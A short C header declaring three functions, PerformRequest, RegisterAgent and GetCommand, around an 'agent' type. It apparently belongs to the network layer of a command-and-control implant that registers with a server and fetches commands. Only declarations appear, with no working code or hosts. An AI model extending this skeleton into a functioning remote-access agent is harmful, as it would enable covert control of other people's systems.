#pragma once
#include "agent.h"



HANDLE PerformRequest(pAgent agent, LPCWSTR UserAgent, LPCWSTR HttpEndpoint, LPCWSTR pswzServerName, LPVOID DataBuff, DWORD dwDataLen, LPCWSTR pswzRequestHeaders);
BOOL RegisterAgent(pAgent agent, VOID* Buffer, ULONG BufferLength);
BOOL GetCommand();
